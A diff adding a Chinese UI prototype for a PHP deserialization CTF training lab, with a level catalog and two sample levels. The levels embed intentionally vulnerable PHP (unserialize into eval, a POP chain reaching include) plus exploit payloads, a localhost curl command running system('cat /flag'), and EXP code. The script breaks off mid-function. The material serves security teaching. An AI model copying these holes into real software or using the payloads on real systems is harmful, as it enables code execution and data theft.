@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>统一关卡页 UI · 交互原型 — PHPSerialize-labs</title>
+<style>
+:root{
+  --accent:#4f6ef7; --accent-weak:#eef1fe;
+  --bg:#f6f7fb; --card:#ffffff; --ink:#23262e; --ink-2:#5b6170; --ink-3:#9aa1b0;
+  --line:#e6e8ef; --ok:#1a9e6c; --ok-weak:#e7f6ef; --warn:#e8622c; --warn-weak:#fdeee6;
+  --code-bg:#fafbfe; --code-line:#eef0f6; --key-bg:#fff7e0; --key-edge:#f2c94c;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --radius:12px; --shadow:0 1px 2px rgba(20,24,40,.05),0 8px 24px rgba(20,24,40,.06);
+}
+html[data-theme="dark"]{
+  --accent:#7d93ff; --accent-weak:#232a45;
+  --bg:#15171e; --card:#1d2029; --ink:#e8eaf1; --ink-2:#a9b0c0; --ink-3:#6d7484;
+  --line:#2b2f3c; --ok:#3ecf8e; --ok-weak:#1b3329; --warn:#ff8a5c; --warn-weak:#3a241a;
+  --code-bg:#181b23; --code-line:#232733; --key-bg:#2e2a1a; --key-edge:#a8862c;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font:15px/1.65 -apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","Segoe UI",sans-serif;}
+a{color:var(--accent);text-decoration:none}
+.wrap{max-width:960px;margin:0 auto;padding:0 20px}
+
+/* ── 原型导航条(评审用,非最终 UI) ─────────────────── */
+.proto{background:#14161d;color:#cfd4e4;font-size:13px}
+.proto .wrap{display:flex;gap:10px;align-items:center;padding:9px 20px;flex-wrap:wrap}
+.proto b{color:#fff;font-weight:600}
+.proto button{background:#262b3b;border:1px solid #3a415a;color:#dfe3f2;border-radius:7px;
+  padding:4px 12px;font-size:13px;cursor:pointer}
+.proto button.on{background:var(--accent);border-color:var(--accent);color:#fff}
+.proto .tip{margin-left:auto;color:#8f97b3;cursor:pointer;text-decoration:underline dotted}
+.proto-note{background:#14161d;color:#aeb6d0;font-size:13px;line-height:1.7}
+.proto-note .wrap{padding:0 20px 14px}
+.proto-note[hidden]{display:none}
+
+/* ── 站点顶栏 ─────────────────────────────────────── */
+.topbar{background:var(--card);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:9}
+.topbar .wrap{display:flex;align-items:center;gap:14px;height:56px}
+.brand{display:flex;align-items:center;gap:8px;font-weight:700}
+.brand .logo{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,#4f6ef7,#19c3a9);
+  display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:800}
+.crumb{color:var(--ink-3);font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.crumb b{color:var(--ink-2);font-weight:600}
+.topbar .sp{flex:1}
+.iconbtn{border:1px solid var(--line);background:var(--card);color:var(--ink-2);border-radius:8px;
+  padding:5px 11px;font-size:13px;cursor:pointer}
+.iconbtn:hover{border-color:var(--accent);color:var(--accent)}
+.iconbtn[disabled]{opacity:.4;cursor:not-allowed}
+.iconbtn[disabled]:hover{border-color:var(--line);color:var(--ink-2)}
+
+/* ── 通用 ─────────────────────────────────────────── */
+.view[hidden]{display:none}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow)}
+.pill{display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;
+  border-radius:999px;padding:2px 10px;line-height:1.7}
+.pill.guided{color:var(--ok);background:var(--ok-weak)}
+.pill.challenge{color:var(--warn);background:var(--warn-weak)}
+.pill.tag{color:var(--accent);background:var(--accent-weak);font-weight:500}
+.stars{color:#f2b418;letter-spacing:2px;font-size:13px}
+
+/* ── 目录页 ───────────────────────────────────────── */
+.hero{margin:26px 0 18px;padding:22px 24px}
+.hero h1{margin:0 0 6px;font-size:22px}
+.hero p{margin:6px 0;color:var(--ink-2);font-size:14px}
+.hero .how{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
+.hero .how div{flex:1;min-width:200px;background:var(--bg);border:1px solid var(--line);
+  border-radius:10px;padding:10px 14px;font-size:13px;color:var(--ink-2)}
+.hero .how b{display:block;color:var(--ink);margin-bottom:2px;font-size:13px}
+.progline{display:flex;align-items:center;gap:10px;margin-top:14px;font-size:13px;color:var(--ink-2)}
+.progbar{flex:1;height:8px;border-radius:99px;background:var(--bg);border:1px solid var(--line);overflow:hidden}
+.progbar i{display:block;height:100%;background:linear-gradient(90deg,#19c3a9,#4f6ef7);width:0;transition:width .3s}
+.chapter{margin:22px 0 10px;display:flex;align-items:baseline;gap:10px}
+.chapter h2{margin:0;font-size:16px}
+.chapter small{color:var(--ink-3)}
+.lvgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media (max-width:720px){.lvgrid{grid-template-columns:1fr}}
+.lv{display:flex;gap:12px;align-items:center;padding:14px 16px;cursor:pointer;transition:border-color .15s}
+.lv:hover{border-color:var(--accent)}
+.lv .no{font:700 13px/1 var(--mono);color:var(--ink-3);background:var(--bg);border:1px solid var(--line);
+  border-radius:8px;padding:7px 9px;white-space:nowrap}
+.lv .t{flex:1;min-width:0}
+.lv .t b{display:block;font-size:14.5px;font-weight:600}
+.lv .t span{font-size:12.5px;color:var(--ink-3)}
+.lv .meta{display:flex;flex-direction:column;align-items:flex-end;gap:5px}
+.lv .done{color:var(--ok);font-size:16px}
+.footer{margin:34px 0 26px;text-align:center;color:var(--ink-3);font-size:13px}
+.footer a{color:var(--ink-2);border-bottom:1px dotted var(--ink-3)}
+
+/* ── 关卡页 ───────────────────────────────────────── */
+.lhead{margin:26px 0 16px}
+.lhead h1{margin:0 0 8px;font-size:22px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.lhead .goal{color:var(--ink-2);font-size:14px}
+.lhead .goal code{font-family:var(--mono);background:var(--accent-weak);color:var(--accent);
+  border-radius:5px;padding:1px 6px;font-size:13px}
+
+.know{padding:16px 20px;margin-bottom:16px;border-left:4px solid var(--ok)}
+.know h3{margin:0 0 6px;font-size:14px;color:var(--ok)}
+.know p{margin:0;font-size:14px;color:var(--ink-2)}
+.know p code{font-family:var(--mono);background:var(--bg);border:1px solid var(--line);
+  border-radius:5px;padding:1px 6px;font-size:12.5px;color:var(--ink)}
+.know.ch-mode{border-left-color:var(--warn)}
+.know.ch-mode h3{color:var(--warn)}
+
+.tabs{display:flex;gap:4px;padding:6px 10px 0;border-bottom:1px solid var(--line)}
+.tabs button{border:none;background:none;font-size:14px;color:var(--ink-2);padding:10px 14px;
+  cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
+.tabs button.on{color:var(--accent);border-bottom-color:var(--accent);font-weight:600}
+.tabs .badge{display:inline-block;min-width:16px;text-align:center;font-size:11px;color:#fff;
+  background:var(--warn);border-radius:99px;padding:0 5px;margin-left:4px;vertical-align:1px}
+.panel{padding:18px 20px}
+.panel[hidden]{display:none}
+
+/* 代码查看器 */
+.codehead{display:flex;align-items:center;gap:10px;padding:10px 16px;border-bottom:1px solid var(--line);
+  font-size:13px;color:var(--ink-3)}
+.codehead .fn{font-family:var(--mono);color:var(--ink-2)}
+.codehead .sp{flex:1}
+.code{overflow:auto;background:var(--code-bg);border-radius:0 0 var(--radius) var(--radius);padding:10px 0}
+.cl{display:flex;font:13px/1.7 var(--mono);white-space:pre}
+.cl .ln{width:44px;flex:none;text-align:right;padding-right:12px;color:var(--ink-3);
+  user-select:none;border-right:1px solid var(--code-line)}
+.cl .cd{padding:0 16px;flex:1}
+.cl.key{background:var(--key-bg);box-shadow:inset 3px 0 0 var(--key-edge)}
+.cl.key .ln{color:var(--key-edge);font-weight:700}
+.knote{display:flex;gap:8px;font-size:12.5px;color:var(--ink-2);padding:1px 0 1px 44px}
+.knote i{flex:none;width:8px;height:8px;border-radius:99px;background:var(--key-edge);margin-top:7px}
+.tk-c{color:var(--ink-3);font-style:italic}
+.tk-s{color:#c96f2f}
+.tk-v{color:#2f7fd0}
+.tk-k{color:#9a4fd6;font-weight:600}
+.tk-m{color:#0fa5a5;font-weight:600}
+.tk-n{color:#b3598f}
+html[data-theme="dark"] .tk-s{color:#e8a15c}
+html[data-theme="dark"] .tk-v{color:#6cb2ff}
+html[data-theme="dark"] .tk-k{color:#c58bff}
+html[data-theme="dark"] .tk-m{color:#4fd8d8}
+html[data-theme="dark"] .tk-n{color:#e07bb4}
+
+/* 作答 */
+.ansrow{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px;font-size:13.5px;color:var(--ink-2)}
+.ansrow code{font-family:var(--mono);background:var(--accent-weak);color:var(--accent);
+  border-radius:5px;padding:2px 7px;font-size:13px}
+textarea{width:100%;min-height:88px;font:13px/1.6 var(--mono);color:var(--ink);background:var(--code-bg);
+  border:1px solid var(--line);border-radius:10px;padding:12px;resize:vertical}
+textarea:focus{outline:2px solid var(--accent-weak);border-color:var(--accent)}
+.btn{border:none;background:var(--accent);color:#fff;border-radius:9px;padding:9px 20px;
+  font-size:14px;font-weight:600;cursor:pointer}
+.btn:hover{filter:brightness(1.08)}
+.btn.ghost{background:var(--bg);color:var(--ink-2);border:1px solid var(--line)}
+.cmd{display:flex;align-items:center;gap:10px;background:var(--code-bg);border:1px solid var(--line);
+  border-radius:10px;padding:10px 14px;margin:8px 0 14px}
+.cmd code{flex:1;font:12.5px/1.6 var(--mono);color:var(--ink-2);word-break:break-all}
+.cmd button{flex:none}
+.toolnote{font-size:13px;color:var(--ink-2);border-top:1px dashed var(--line);margin-top:16px;padding-top:12px}
+.toolnote li{margin:4px 0}
+.ansresult{margin-top:12px;font-size:13px;color:var(--warn);background:var(--warn-weak);
+  border-radius:9px;padding:9px 13px}
+
+/* 提示 */
+.hint{border:1px solid var(--line);border-radius:10px;margin-bottom:10px;overflow:hidden}
+.hint>button{width:100%;text-align:left;border:none;background:var(--bg);color:var(--ink-2);
+  font-size:13.5px;padding:10px 14px;cursor:pointer;font-weight:600}
+.hint>button:hover{color:var(--accent)}
+.hint .body{padding:11px 15px;font-size:14px;color:var(--ink);border-top:1px dashed var(--line)}
+.hint .body[hidden]{display:none}
+.hint.challenge>button{background:var(--warn-weak);color:var(--warn)}
+
+/* 解析 */
+.gate{border:1px dashed var(--key-edge);background:var(--key-bg);border-radius:10px;padding:16px 18px}
+.gate p{margin:0 0 10px;font-size:13.5px;color:var(--ink-2)}
+.gate label{display:flex;gap:8px;align-items:flex-start;font-size:13.5px;cursor:pointer}
+.gate .btn{margin-top:12px}
+.gate .btn[disabled]{opacity:.45;cursor:not-allowed}
+.wp[hidden]{display:none}
+.wp h4{margin:18px 0 6px;font-size:14.5px}
+.wp p{font-size:14px;color:var(--ink-2);margin:6px 0}
+.wp pre{background:var(--code-bg);border:1px solid var(--line);border-radius:10px;
+  padding:12px 14px;overflow:auto;font:12.5px/1.7 var(--mono);color:var(--ink)}
+.wp .more{display:inline-block;margin-top:8px;font-size:13.5px}
+</style>
+</head>
+<body>
+
+<!-- ══ 原型导航(评审用,非最终 UI) ══ -->
+<div class="proto">
+  <div class="wrap">
+    <b>UI 原型</b>
+    <button data-go="catalog">目录页</button>
+    <button data-go="l7">关卡页 · 引导模式(Level 7 示例)</button>
+    <button data-go="l16">关卡页 · 挑战模式(Level 16 示例)</button>
+    <span class="tip" onclick="const n=document.getElementById('pnote');n.hidden=!n.hidden">设计要点</span>
+  </div>
+</div>
+<div class="proto-note" id="pnote" hidden>
+  <div class="wrap">
+    ① 题目代码零改动:源码 Tab 展示的就是现在 highlight_file 的同一份代码,仅替换展示层;
+    ② 「作答」Tab 解决新手最大的门槛——页面直接可提交,并给出 curl / HackBar 指引;
+    ③ 提示渐进式:引导关多条、挑战关仅一条兜底;「解析」有防剧透门,完整 WP 外链 GitHub(中期迁到 writeups/ 单页)。
+  </div>
+</div>
+
+<!-- ══ 站点顶栏 ══ -->
+<div class="topbar">
+  <div class="wrap">
+    <span class="brand"><span class="logo">探</span>探姬 · HelloCTF</span>
+    <span class="crumb" id="crumb"></span>
+    <span class="sp"></span>
+    <button class="iconbtn" id="prevBtn" disabled>← 上一关</button>
+    <button class="iconbtn" id="homeBtn">目录</button>
+    <button class="iconbtn" id="nextBtn" disabled>下一关 →</button>
+    <button class="iconbtn" id="themeBtn" title="切换明暗">◐</button>
+  </div>
+</div>
+
+<div class="wrap">
+
+<!-- ══ 视图:目录页 ══ -->
+<section class="view" id="view-catalog">
+  <div class="card hero">
+    <h1>从 0 开始的 PHP 反序列化引导靶场</h1>
+    <p>18 个关卡,从类的实例化一路走到字符串逃逸。每一关:读源码 → 找到可控点 → 构造 payload → 拿 flag。</p>
+    <div class="how">
+      <div><b>① 答题方式</b>每关「作答」页有输入框,直接提交;也支持 curl / HackBar。</div>
+      <div><b>② 卡住了?</b>先看「提示」(逐条展开);引导关讲得细,挑战关只给一条。</div>
+      <div><b>③ 真不会?</b>「解析」页有思路和 EXP,完整 WriteUP 一键直达。</div>
+    </div>
+    <div class="progline">
+      <span id="progText">已完成 0 / 18</span>
+      <div class="progbar"><i id="progBar"></i></div>
+      <span style="color:var(--ink-3)">点击卡片可标记完成</span>
+    </div>
+  </div>
+  <div id="catalogList"></div>
+  <div class="card lv" style="margin-top:6px" onclick="alert('原型演示:进阶练习列表页(exerciseCollection)')">
+    <span class="no">EX</span>
+    <div class="t"><b>进阶练习 · 真题实战</b><span>练习题集:天山固网 2024 等赛事真题改编</span></div>
+    <span class="pill challenge">纯挑战</span>
+  </div>
+  <div class="footer">
+    <p>© 2024 Probius · <a href="#" onclick="return false">GitHub</a> · <a href="#" onclick="return false">hello-ctf.com 配套教程</a> · 前置:PHP 基础 / 面向对象</p>
+  </div>
+</section>
+
+<!-- ══ 视图:关卡页(Level 7 · 引导) ══ -->
+<section class="view" id="view-l7">
+  <div class="lhead">
+    <h1>Level 7 · 实例化和反序列化
+      <span class="pill guided">引导</span><span class="stars">★★</span>
+      <span class="pill tag">反序列化基础</span><span class="pill tag">漏洞原理</span>
+    </h1>
+    <div class="goal">目标:页面已经演示了「实例化」和「反序列化」创建对象的差别——通过 <code>POST o</code>
+      提交你构造的序列化串,让 <code>backdoor()</code> 执行<b>你指定的命令</b>,读出 flag。</div>
+  </div>
+
+  <div class="card know">
+    <h3>本关知识点</h3>
+    <p>实例化(<code>new FLAG()</code>)创建对象时,属性值来自类定义,改不了;而
+       <code>unserialize($str)</code> 是按字符串<b>「还原」</b>对象——<b>字符串可控,对象的属性就可控</b>。
+       页面演示里那串与默认命令不同的序列化串,就是这个原理。</p>
+  </div>
+
+  <div class="card">
+    <div class="tabs">
+      <button class="on" data-tab="src">题目源码</button>
+      <button data-tab="ans">作答</button>
+      <button data-tab="hint">提示<span class="badge">3</span></button>
+      <button data-tab="wp">解析</button>
+    </div>
+    <div class="panel" data-panel="src">
+      <div class="codehead"><span class="fn">Level7/index.php</span><span>黄色行为关键代码</span><span class="sp"></span><button class="iconbtn" onclick="copyText(this,'src7')">复制源码</button></div>
+      <div class="code" id="code7"></div>
+    </div>
+    <div class="panel" data-panel="ans" hidden>
+      <div class="ansrow">本关接收参数:<code>POST o</code> 内容:序列化字符串(建议 URL 编码)</div>
+      <textarea id="ans7" placeholder="O:4:&quot;FLAG&quot;:1:{s:12:&quot;flag_command&quot;;s:XX:&quot;...&quot;;}"></textarea>
+      <div style="display:flex;gap:10px;margin-top:10px">
+        <button class="btn" onclick="fakeSubmit(7)">提交到关卡</button>
+        <button class="btn ghost" onclick="document.getElementById('ans7').value=''">清空</button>
+      </div>
+      <div id="res7"></div>
+      <div class="toolnote">偏好命令行?等价的 curl:
+        <div class="cmd">
+          <code id="curl7">curl -sX POST --data-urlencode 'o=O:4:"FLAG":1:{s:12:"flag_command";s:22:"system('cat /flag');";}' http://localhost/Level7/</code>
+          <button class="iconbtn" onclick="copyText(this,'curl7')">复制</button>
+        </div>
+        <ul>
+          <li><b>HackBar</b>(浏览器插件):勾选 Post data,填 <code>o=...</code> Execute;</li>
+          <li><b>F12 控制台</b>:<code>fetch('/',{method:'POST',body:'o='+encodeURIComponent(payload)})</code>;</li>
+          <li>payload 里有不可见字符(<code>%00</code>)时务必 URL 编码——第 6 关会讲到。</li>
+        </ul>
+      </div>
+    </div>
+    <div class="panel" data-panel="hint" hidden>
+      <div class="hint"><button onclick="revealHint(this)">提示 1 / 3 · 找入口</button>
+        <div class="body" hidden>页面最后:提交的 <code>o</code> 被 <code>unserialize()</code> 还原成对象,紧接着调用
+        <code>-&gt;backdoor()</code>。所以你要控制的,是这个被还原对象的属性。</div></div>
+      <div class="hint"><button onclick="revealHint(this)">提示 2 / 3 · 找可控点</button>
+        <div class="body" hidden><code>backdoor()</code> 执行 <code>eval($this-&gt;flag_command)</code>。
+        <code>flag_command</code> 是 public 属性——反序列化时它完全由你的字符串决定。
+        本地写一个同结构 FLAG 类、改掉 <code>flag_command</code>、serialize 一下试试。</div></div>
+      <div class="hint"><button onclick="revealHint(this)">提示 3 / 3 · 动手</button>
+        <div class="body" hidden>flag 在 <code>flag.php</code>:让命令变成
+        <code>system('cat /flag');</code>(Docker 环境)或 include flag.php。
+        参考 Level 7 页面上的演示串格式,注意长度值 <code>s:XX</code> 要和内容一致。</div></div>
+    </div>
+    <div class="panel" data-panel="wp" hidden>
+      <div class="gate" id="gate7">
+        <p><b>解析包含完整答案。</b>确认你已经尝试过,或者确实卡住了?</p>
+        <label><input type="checkbox" onchange="document.getElementById('wpBtn7').disabled=!this.checked">
+          我已自己尝试过本关</label><br>
+        <button class="btn" id="wpBtn7" disabled onclick="showWp(7)">展开解析</button>
+      </div>
+      <div class="wp" id="wp7" hidden>
+        <h4>思路</h4>
+        <p>反序列化 = 按字符串「还原」对象,属性值完全由字符串决定 → <code>flag_command</code> 可控 → <code>eval</code> 执行任意 PHP 代码。</p>
+        <h4>EXP</h4>
+        <pre>class FLAG{
+    public $flag_command = "system('cat /flag');";
+}
+echo urlencode(serialize(new FLAG()));
+// o=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A12%3A%22flag_command%22%3Bs%3A19%3A%22system(...)%22%3B%7D</pre>
+        <a class="more" href="https://github.com/ProbiusOfficial/PHPSerialize-labs#level-7" target="_blank">在 GitHub 查看完整 WriteUP ↗</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ 视图:关卡页(Level 16 · 挑战) ══ -->
+<section class="view" id="view-l16">
+  <div class="lhead">
+    <h1>Level 16 · POP 链构造
+      <span class="pill challenge">挑战</span><span class="stars">★★★</span>
+      <span class="pill tag">POP 链</span><span class="pill tag">魔术方法组合</span>
+    </h1>
+    <div class="goal">目标:把三个魔术方法串成一条链,让 <code>include</code> 执行。<code>POST o</code> 提交。
+      本关不再逐步引导——自己读代码,找链子。</div>
+  </div>
+
+  <div class="card know ch-mode">
+    <h3>挑战关</h3>
+    <p>本关几乎不提供讲解。唯一的提示在「提示」页,确认穷尽思路后再看;再不行,「解析」见。</p>
+  </div>
+
+  <div class="card">
+    <div class="tabs">
+      <button class="on" data-tab="src">题目源码</button>
+      <button data-tab="ans">作答</button>
+      <button data-tab="hint">提示<span class="badge">1</span></button>
+      <button data-tab="wp">解析</button>
+    </div>
+    <div class="panel" data-panel="src">
+      <div class="codehead"><span class="fn">Level16/index.php</span><span class="sp"></span><button class="iconbtn" onclick="copyText(this,'src16')">复制源码</button></div>
+      <div class="code" id="code16"></div>
+    </div>
+    <div class="panel" data-panel="ans" hidden>
+      <div class="ansrow">本关接收参数:<code>POST o</code> 内容:序列化字符串</div>
+      <textarea id="ans16" placeholder="TzY6..."></textarea>
+      <div style="display:flex;gap:10px;margin-top:10px">
+        <button class="btn" onclick="fakeSubmit(16)">提交到关卡</button>
+        <button class="btn ghost" onclick="document.getElementById('ans16').value=''">清空</button>
+      </div>
+      <div id="res16"></div>
+      <div class="toolnote">等价 curl:
+        <div class="cmd">
+          <code id="curl16">curl -sX POST --data-urlencode 'o=<你的链>' http://localhost/Level16/</code>
+          <button class="iconbtn" onclick="copyText(this,'curl16')">复制</button>
+        </div>
+      </div>
+    </div>
+    <div class="panel" data-panel="hint" hidden>
+      <div class="hint challenge"><button onclick="revealHint(this)">唯一提示</button>
+        <div class="body" hidden>从「终点」倒着找:<code>include $this-&gt;a</code> 谁能触发?谁又能触发它?
+        ——入口是 <code>__wakeup</code> 里的一次 <code>echo</code>。</div></div>
+    </div>
+    <div class="panel" data-panel="wp" hidden>
+      <div class="gate" id="gate16">
+        <p><b>解析包含完整答案。</b>确认你已经尝试过,或者确实卡住了?</p>
+        <label><input type="checkbox" onchange="document.getElementById('wpBtn16').disabled=!this.checked">
+          我已自己尝试过本关</label><br>
+        <button class="btn" id="wpBtn16" disabled onclick="showWp(16)">展开解析</button>
+      </div>
+      <div class="wp" id="wp16" hidden>
+        <h4>链子</h4>
+        <p><code>INIT(__wakeup, echo $name)</code> → 触发 <code>B(__toString)</code> →
+           <code>($this-&gt;b)()</code> 触发 <code>A(__invoke)</code> → <code>include $this-&gt;a</code></p>
+        <h4>EXP</h4>
+        <pre>class A { public $a = 'flag.php'; }
+class B { public $b; }
+class INIT { public $name; }
+$b = new B(); $b->b = new A();
+$i = new INIT(); $i->name = $b;
+echo urlencode(serialize($i));</pre>
+        <a class="more" href="https://github.com/ProbiusOfficial/PHPSerialize-labs#level-16" target="_blank">在 GitHub 查看完整 WriteUP ↗</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+</div><!-- /wrap -->
+
+<!-- 源码数据(与仓库原文一致) -->
+<script type="text/plain" id="raw7"><?php
+
+/*
+--- HelloCTF - 反序列化靶场 关卡 7 : 实例化和反序列化 ---
+
+HINT：可控的输入 简单的漏洞演示
+
+# -*- coding: utf-8 -*-
+# @Author: 探姬(@ProbiusOfficial)
+# @Date:   2024-07-01 20:30
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
+# @email:  admin@hello-ctf.com
+# @link:   hello-ctf.com
+
+*/
+
+class FLAG{
+    public $flag_command = "echo 'Hello CTF!<br>';";
+
+    function backdoor(){
+        eval($this->flag_command);
+    }
+}
+
+$unserialize_string = 'O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo \'Hello World!<br>\';";}'; // 注意看这里，与预定的命令不同
+
+$Instantiate_object = new FLAG(); // 实例化的对象
+
+$Unserialize_object = unserialize($unserialize_string); // 反序列化的对象
+
+if(isset($_POST['o']))
+{
+     unserialize($_POST['o'])->backdoor();
+}
+else {
+    highlight_file(demo);
+
+    echo "<br>'$Instantiate_object->backdoor()' will output:";
+    $Instantiate_object->backdoor();
+
+    echo "'$Unserialize_object->backdoor()' will output:";
+    $Unserialize_object->backdoor();
+
+    highlight_file(source);
+}
+</script>
+<script type="text/plain" id="raw16"><?php
+
+/*
+--- HelloCTF - 反序列化靶场 关卡 16 : zePOP---
+
+__wakeUp() 方法用于反序列化时自动调用。例如 unserialize()。
+__invoke() 方法用于一个对象被当成函数时应该如何回应。例如 $obj() 应该显示些什么。
+__toString() 方法用于一个对象被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。
+
+试着把他们串起来吧ww
+
+# -*- coding: utf-8 -*-
+# @Author: 探姬(@ProbiusOfficial)
+# @Date:   2024-07-01 20:30
+# @Repo:   github.com/ProbiusOfficial/PHPSerialize-labs
+# @email:  admin@hello-ctf.com
+# @link:   hello-ctf.com
+
+*/
+
+class A {
+    public $a;
+    public function __invoke() {
+            include $this->a;
+            return $flag;
+    }
+}
+
+class B {
+    public $b;
+    public function __toString() {
+        $f = $this->b;
+        return $f();
+    }
+}
+
+
+class INIT {
+    public $name;
+    public function __wakeUp() {
+        echo $this->name.' is awake!';
+    }
+}
+
+if(isset($_POST['o'])) {
+    unserialize($_POST['o']);
+} else {
+    highlight_file(__FILE__);
+}
+</script>
+
+<script>
+/* ───────── 数据 ───────── */
+var CHAPTERS=[
+ {name:"第一章 · 面向对象基础",items:[[1,"类的实例化","guided",1],[2,"对象中值的传递","guided",1],[3,"对象中值的权限","guided",1]]},
+ {name:"第二章 · 序列化入门",items:[[4,"序列化初体验","guided",1],[5,"序列化的普通值规则","guided",2],[6,"序列化的权限修饰规则","guided",2]]},
+ {name:"第三章 · 反序列化与魔术方法",items:[[7,"实例化和反序列化","guided",2],[8,"构造/析构函数与 GC 机制","guided",2],[9,"构造函数的后门","guided",2],[10,"__wakeup()","guided",1],[11,"__wakeup() · CVE-2016-7124","challenge",2],[12,"__sleep()","guided",2],[13,"__toString()","guided",1],[14,"__invoke()","guided",1]]},
+ {name:"第四章 · POP 链",items:[[15,"POP 链前置","challenge",2],[16,"POP 链构造","challenge",3]]},
+ {name:"第五章 · 字符串逃逸",items:[[17,"逃逸基础 · 无中生有","guided",3],[18,"逃逸基础 · 尾部判定","guided",3]]}
+];
+var KEYLINES={
+ 7:[{from:25,to:25,label:"页面演示用的反序列化串——注意它与类里默认的命令不同,这就是「还原可控」"},
+    {from:17,to:23,label:"目标类:backdoor() 会 eval 掉 flag_command"},
+    {from:36,to:39,label:"入口:POST 参数 o → unserialize → backdoor()"}],
+ 16:[]
+};
+
+/* ───────── 极简 PHP 高亮 ───────── */
+var KW=/^(abstract|and|array|as|break|case|catch|class|const|continue|die|do|echo|else|elseif|empty|exit|extends|final|finally|for|foreach|function|global|if|implements|include|include_once|instanceof|isset|list|namespace|new|or|print|private|protected|public|require|require_once|return|static|switch|throw|try|unset|use|var|while|xor|true|false|null|TRUE|FALSE|NULL)$/i;
+var MAGIC=/^__(construct|destruct|wakeup|sleep|toString|invoke|call|get|set|isset|unset|clone|autoload|toString)$/i;
+function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
+function tokenize(src){
+  var lines=src.replace(/\n$/,"").split("\n"),out=[],inBlock=false;
+  lines.forEach(function(line){
+    var html="",i=0,n=line.length,buf="";
+    function flush(){if(buf){html+=esc(buf);buf=""}}
+    while(i<n){
+      if(inBlock){
+        var e=line.indexOf("*/",i);
+        if(e<0){html+='<span class="tk-c">'+esc(line.slice(i))+'</span>';i=n;}
+        else{html+='<span class="tk-c">'+esc(line.slice(i,e+2))+'</span>';i=e+2;inBlock=false;}
+        continue;
+      }
+      var c=line[i];
+      if(c==='/'&&line[i+1]==='*'){flush();var e2=line.indexOf("*/",i+2);
+        if(e2<0){html+='<span class="tk-c">'+esc(line.slice(i))+'</span>';i=n;inBlock=true;}
+        else{html+='<span class="tk-c">'+esc(line.slice(i,e2+2))+'</span>';i=e2+2;}continue;}
+      if(c==='/'&&line[i+1]==='/'||(c==='#'&&line[i-1]!=='\\')){flush();html+='<span class="tk-c">'+esc(line.slice(i))+'</span>';i=n;continue;}
+      if(c==='"'||c==="'"){flush();var q=c,j=i+1;
+        while(j<n){if(line[j]==='\\'){j+=2;continue}if(line[j]===q)break;j++}
+        html+='<span class="tk-s">'+esc(line.slice(i,Math.min(j+1,n)))+'</span>';i=Math.min(j+1,n);continue;}
+      if(c==='$'){flush();var j2=i+1;while(j2<n&&/[\w]/.test(line[j2]))j2++;
+        html+='<span class="tk-v">'+esc(line.slice(i,j2))+'</span>';i=j2;continue;}
+      if(/[\w]/.test(c)){flush();var j3=i;while(j3<n&&/[\w]/.test(line[j3]))j3++;
+        var w=line.slice(i,j3);
+        if(MAGIC.test(w))html+='<span class="tk-m">'+esc(w)+'</span>';
+        else if(KW.test(w))html+='<span class="tk-k">'+esc(w)+'</span>';
+        else if(/^\d+$/.test(w))html+='<span class="tk-n">'+esc(w)+'</span>';
+        else buf+=w;
+        i=j3;continue;}
+      buf+=c;i++;
+    }
+    flush();out.push(html);
+  });
+  return out;
+}
+function renderCode(elId,rawId,keyLines){
+  var toks=tokenize(document.getElementById(rawId).textContent);
+  var keyMap={};(keyLines||[]).forEach(function(k){for(var i=k.from;i<=k.to;i++)keyMap[i]=k.label});
+  var html="",lastKey=null;
+  toks.forEach(function(t,idx){
+    var no=idx+1,cls=keyMap[no]?"key":"";
+    html+='<div class="cl '+cls+'"><span class="ln">'+no+'</span><span class="cd">'+(t||" ")+'</span></div>';
+    if(keyMap[no]&&keyMap[no]!==lastKey){html+='<div class="knote"><i></i><span>'+keyMap[no]+'</span></div>';lastKey=keyMap[no];}
+    if(!keyMap[no])lastKey=null;
+  });
+  document.getElementById(elId).innerHTML=html;
+}
+
+/* ───────── 目录页 ───────── */
+function doneKey(n){return "phplab-done-"+n}
+function getDone(){try{return JSON.parse(localStorage.getItem("phplab-done")||"[]")}catch(e){return[]}}
+function setDone(a){localStorage.setItem("phplab-done",JSON.stringify(a))}
+function renderCatalog(){
+  var done=getDone(),html="";
+  CHAPTERS.forEach(function(ch){
+    html+='<div class="chapter"><h2>'+ch.name+'</h2><small>'+ch.items.length+' 关</small></div><div class="lvgrid">';
+    ch.items.forEach(function(it){
+      var no=it[0],t=it[1],mode=it[2],diff=it[3];
+      var isDone=done.indexOf(no)>=0;
+      html+='<div class="card lv" onclick="openLevel(\''+(no===7?'l7':no===16?'l16':'demo-'+no)+'\','+no+')">'
+        +'<span class="no">L'+no+'</span>'
+        +'<div class="t"><b>'+t+'</b><span>'+(mode==="guided"?"引导关":"挑战关 · 提示极少")+'</span></div>'
+        +'<div class="meta"><span class="stars">'+"★".repeat(diff)+'☆'.repeat(3-diff)+'</span>'
+        +'<span class="pill '+mode+'">'+(mode==="guided"?"引导":"挑战")+'</span></div>'
+        +(isDone?'<span class="done" title="已完成">✔</span>':'')
+        +'</div>';
+    });
+    html+='</div>';
+  });
+  document.getElementById("catalogList").innerHTML=html;
